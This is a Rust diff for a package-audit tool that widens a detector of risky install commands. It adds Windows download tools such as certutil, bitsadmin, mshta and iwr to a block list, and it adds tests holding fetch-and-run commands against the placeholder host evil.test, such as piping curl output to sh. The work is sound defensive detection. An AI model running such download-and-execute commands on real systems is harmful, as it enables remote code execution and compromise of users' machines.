@@ -187,7 +187,7 @@ fn upgrade_advice(
 /// normal build step, while `node -e` runs inline code.
 pub(crate) fn risky_install_command(command: &str) -> bool {
     let lowered = command.to_ascii_lowercase();
-    let tokens: Vec<&str> = lowered
+    let tokens: Vec<String> = lowered
         .split(|character: char| {
             character.is_whitespace()
                 || matches!(
@@ -196,16 +196,31 @@ pub(crate) fn risky_install_command(command: &str) -> bool {
                 )
         })
         .filter(|token| !token.is_empty())
+        .map(|token| {
+            // `/usr/bin/curl`, `curl.exe`, and Windows paths all mean curl.
+            let base = token.rsplit(['/', '\\']).next().unwrap_or(token);
+            for suffix in [".exe", ".cmd", ".bat"] {
+                if let Some(stripped) = base.strip_suffix(suffix) {
+                    return stripped.to_string();
+                }
+            }
+            base.to_string()
+        })
         .collect();
-    let word = |needle: &str| tokens.contains(&needle);
+    let word = |needle: &str| tokens.iter().any(|token| token == needle);
     if [
         "curl",
         "wget",
         "nc",
         "base64",
         "iex",
+        "iwr",
+        "irm",
         "powershell",
         "pwsh",
+        "certutil",
+        "bitsadmin",
+        "mshta",
         "eval",
     ]
     .iter()
@@ -217,7 +232,7 @@ pub(crate) fn risky_install_command(command: &str) -> bool {
         return true;
     }
     for (index, token) in tokens.iter().enumerate() {
-        let flags: &[&str] = match *token {
+        let flags: &[&str] = match token.as_str() {
             "python" | "python2" | "python3" => &["-c"],
             "perl" | "ruby" => &["-e"],
             "php" => &["-r"],
@@ -225,7 +240,7 @@ pub(crate) fn risky_install_command(command: &str) -> bool {
             _ => continue,
         };
         for (skipped, next) in tokens[index + 1..].iter().take(2).enumerate() {
-            if flags.contains(next) {
+            if flags.contains(&next.as_str()) {
                 return true;
             }
             if !next.starts_with('-') || skipped == 1 {
@@ -1830,6 +1845,27 @@ mod tests {
         let finding = finding(&findings, "publisher-changed");
         assert_eq!(finding.severity, Severity::Info);
         assert!(!ids(&findings).contains(&"publisher-not-maintainer"));
+    }
+
+    #[test]
+    fn install_commands_are_matched_by_basename_and_windows_suffix() {
+        for risky in [
+            "powershell.exe -c iwr https://evil.test/x",
+            "pwsh.exe -c iwr https://evil.test/x",
+            "curl.exe https://evil.test/x",
+            "/usr/bin/curl https://evil.test/x | sh",
+            "C:\\Windows\\System32\\curl.exe https://evil.test/x",
+            "certutil -urlcache -f https://evil.test/x y",
+            "bitsadmin /transfer job https://evil.test/x y",
+            "mshta https://evil.test/x",
+            "iwr https://evil.test/x",
+            "irm https://evil.test/x",
+        ] {
+            assert!(risky_install_command(risky), "{risky}");
+        }
+        for safe in ["node scripts/evaluate.js", "bash -c \"echo hi\""] {
+            assert!(!risky_install_command(safe), "{safe}");
+        }
     }
 
     #[test]
